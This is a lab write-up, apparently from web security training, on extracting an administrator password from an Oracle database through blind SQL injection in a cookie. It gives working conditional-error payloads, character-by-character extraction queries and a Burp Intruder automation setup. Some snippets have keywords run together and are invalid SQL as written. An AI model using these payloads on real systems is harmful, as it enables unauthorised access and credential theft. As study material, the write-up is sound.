## 🎯 Objective

Exploit a **blind SQL injection vulnerability** to extract the **administrator password** using **conditional database errors** in an Oracle database, where:

- No query output is reflected
- No SQL error messages are shown
- The only feedback channel is **whether a database error occurs**

---

## 🧩 1. Initial Testing & Vulnerability Identification

### Parameters Tested

- `category`
- `productId`

Both parameters were tested with a single quote (`'`) and produced **no observable change**, indicating they were not injectable.

### Cookie-Based Testing

While inspecting the HTTP request, a cookie parameter named **`TrackingId`** was identified and tested.

### Observation

- Normal `TrackingId` → Application responds normally (HTTP 200)
- Crafted `TrackingId` payload → Application responds with **HTTP 500 Internal Server Error**

This behavior indicates:

- The cookie value is included in a SQL query
- SQL errors are suppressed in the response body
- Application behavior changes based on **whether a database error occurs**

This confirms a **blind SQL injection vulnerability using conditional errors**.

---

## 🧠 2. Why This Is Blind SQL Injection with Conditional Errors

In this lab:

- No database output is displayed
- No SQL error messages are visible
- Page content does not change

The **only observable signal** is:

- **Error (HTTP 500)** vs **No Error (HTTP 200)**

Therefore:

- `UNION SELECT` attacks are useless
- Boolean content-based SQLi does not work
- Data must be inferred by **intentionally triggering database errors**

The backend query is likely similar to:

```sql
SELECT trackingIdFROM tracking
WHERE trackingId='<TrackingId>';

```

---

## 🧪 3. Confirming Conditional Error Control

### Payload Used (Conceptual)

```sql
'||(
SELECT CASE
WHEN (1=1) THEN TO_CHAR(1/0)
ELSE ''
END
FROM dual
)||'

```

### Result

- Condition TRUE → division by zero → **HTTP 500**
- Condition FALSE → no error → **HTTP 200**

This confirms full control over **conditional error execution**, which becomes the TRUE/FALSE signal.

---

## ❌ 4. Why UNION SELECT Does Not Work

### Failed Attempt (Example)

```sql
'||UNION SELECT username, password FROM users--'

```

### Why It Fails

- The application does not reflect query output
- The backend only reacts to runtime errors
- UNION results are silently ignored

**Lesson**

If query output is not reflected, immediately switch to **blind SQL injection techniques**.

---

## 🧠 5. Why Certain Payloads Failed

### ❌ Failed Payload — Invalid Boolean Context

```sql
ANDSELECT usernameFROM users

```

**Why it fails**

- `AND` requires a boolean expression
- `SELECT` returns rows, not TRUE/FALSE
- SQL syntax is invalid in this context

---

### ❌ Failed Payload — Multiple Row Subquery

```sql
AND (SELECT passwordFROM users)='x'

```

**Why it fails**

- Oracle does not allow multi-row subqueries in comparisons
- This causes uncontrolled errors

---

### ✅ Corrected Pattern

```sql
AND ROWNUM=1

```

**Why it works**

- Forces the subquery to return exactly one row
- Keeps errors condition‑dependent

---

## ✅ 6. Core Payload Used in the Lab (Final Form)

```sql
'||(
SELECT CASE
WHEN <condition>
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator' AND ROWNUM=1
)||'

```

### Why This Payload Was Used

This payload satisfies all lab constraints:

- Works in **Oracle**
- Preserves SQL syntax using string concatenation (`||`)
- Triggers errors **only when conditions are TRUE**
- Prevents accidental errors using `ROWNUM=1`

---

## 🔎 7. SQL Functions Used and Why

### 1️⃣ `CASE WHEN`

Used to conditionally trigger an error.

```sql
CASEWHENconditionTHEN errorELSE safeEND

```

Without `CASE WHEN`, the database would error every time.

---

### 2️⃣ `TO_CHAR(1/0)`

- `1/0` causes a guaranteed runtime error
- `TO_CHAR()` forces evaluation inside a SELECT clause
- Error presence becomes the TRUE signal

---

### 3️⃣ `LENGTH()`

```sql
LENGTH(password)

```

Used to determine password length before extraction.

---

### 4️⃣ `SUBSTR()`

```sql
SUBSTR(password, position,1)

```

Used to extract **one character at a time**, which is required in blind SQLi.

---

## 🧪 8. Actions Performed to Extract the Password

### Step 1: Confirm Administrator Exists

```sql
WHENEXISTS (SELECT1FROM usersWHERE username='administrator')

```

- Error occurred → user confirmed

---

### Step 2: Determine Password Length

```sql
WHEN LENGTH(password)=20

```

- Error occurred only when length = 20

---

### Step 3: Character-by-Character Extraction

```sql
WHEN SUBSTR(password,1,1)='6'

```

- TRUE → error
- FALSE → no error

Each successful error revealed one character.

---

### Step 4: Automation with Burp Intruder

- Position payload: `1–20`
- Character payload: `a–z`, `0–9`
- Detection method: **HTTP 500 responses**
- Attack type: **Cluster Bomb**

---

## 📊 9. Final Result

```
Username: administrator
Password: 67me9av0blkd0mis1ztm

```

- Login successful
- Administrator access confirmed
- Lab solved
- Screenshot:
  <img width="1248" height="258" alt="image" src="https://github.com/user-attachments/assets/3d79f03f-e52d-42c9-a411-afdc815f3c9f" />


---

## 🔮 10. Future Testing Notes

### Blind SQL Injection Workflow

1. Identify injection point
2. Identify feedback channel (errors / timing)
3. Confirm conditional control
4. Validate data existence
5. Determine data length
6. Extract incrementally
7. Automate repetitive steps

### Common Mistakes to Avoid

- Forgetting `ROWNUM=1` in Oracle
- Triggering unconditional errors
- Attempting UNION without reflected output
- Skipping existence checks

---

## 🧭 11. Notes for My Future Self

- Blind SQLi relies on inference, not output
- Errors can act as a reliable boolean signal
- Oracle requires strict single-row subqueries
- Character-by-character extraction is unavoidable
- Automation is essential for accuracy and speed
